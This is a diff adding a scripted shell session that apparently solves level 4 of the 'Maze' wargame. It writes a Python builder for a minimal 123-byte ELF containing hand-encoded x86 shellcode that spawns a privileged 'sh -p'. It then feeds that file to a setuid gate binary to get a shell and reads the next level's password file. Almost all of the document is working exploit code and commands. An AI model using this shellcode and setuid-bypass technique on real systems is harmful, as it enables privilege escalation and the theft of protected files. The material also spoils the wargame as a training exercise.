@@ -1,0 +1,52 @@
+@sleep 1
+id
+echo '# Maze L4: /maze/maze4 (setuid maze5) is a stat-then-exec gate:'
+ls -la /maze/maze4
+objdump -d -M intel /maze/maze4 --section=.text 2>/dev/null | grep -B2 -A3 "0f b6 d0\|imul" | head -10
+echo '# gdb-verified gate: product = file[7]*file[8]; lseek offset = dword(file[28..31]);'
+echo '# compare = dword(file[off+12..15]); pass iff product == compare && size <= 123.'
+echo '# An ELF passes for free: bytes 7,8 = EI_OSABI/EI_ABIVERSION = 0*0 = 0,'
+echo '# e_phoff = 52 = the lseek offset, phdr0.p_paddr = 0 = the compared dword.'
+echo '# NOTE: $HOME is root-owned and /tmp is nosuid -> work in /run/screen/l4.'
+mkdir -p /run/screen/l4 && cd /run/screen/l4
+echo '# Writing the tiny-ELF builder (heredoc, code visible):'
+@line cat > /run/screen/l4/tinel.py <<'PYEOF'
+@line import struct, sys
+@line V = 0x08048000
+@line code = bytes([
+@line     0x31, 0xC0,                       # xor eax, eax
+@line     0x50,                             # push eax (NULL envp)
+@line     0x68, 0x0C, 0x80, 0x04, 0x08,     # push "-p" @ 0x0804800c
+@line     0x68, 0x09, 0x80, 0x04, 0x08,     # push "sh" @ 0x08048009
+@line     0x89, 0xE1,                       # mov ecx, esp (argv)
+@line     0xBB, 0x09, 0x80, 0x04, 0x08,     # mov ebx, "sh"
+@line     0x31, 0xD2,                       # xor edx, edx
+@line     0xB0, 0x0B,                       # execve
+@line     0xCD, 0x80,
+@line ])
+@line assert len(code) == 26
+@line ehdr = bytearray(52)
+@line ehdr[0:8] = b"\x7fELF\x01\x01\x01\x00"
+@line ehdr[9:15] = b"sh\x00-p\x00"         # strings hidden in EI_PAD
+@line ehdr[15] = 0
+@line struct.pack_into("<HHIIIIIHHHHHH", ehdr, 16,
+@line                  2, 3, 1, V + 84, 52, 0, 0, 52, 32, 1, 0, 0, 0)
+@line phdr = bytearray(32)
+@line struct.pack_into("<IIIIIIII", phdr, 0,
+@line                  1, 0, V, 0, 123, 123, 5, 0x1000)
+@line data = bytes(ehdr) + bytes(phdr) + code
+@line data += b"\x00" * (123 - len(data))
+@line assert len(data) == 123
+@line open(sys.argv[1], "wb").write(data)
+@line print("wrote", len(data), "bytes")
+@line PYEOF
+python3 /run/screen/l4/tinel.py /run/screen/l4/tiny
+chmod 755 /run/screen/l4/tiny
+cp /bin/sh /run/screen/l4/sh && chmod 755 /run/screen/l4/sh
+xxd /run/screen/l4/tiny | head -5
+/maze/maze4 tiny
+@wait 6 id
+@wait 6 cat /etc/maze_pass/maze5
+@wait 6 exit
+@sleep 2
+exit
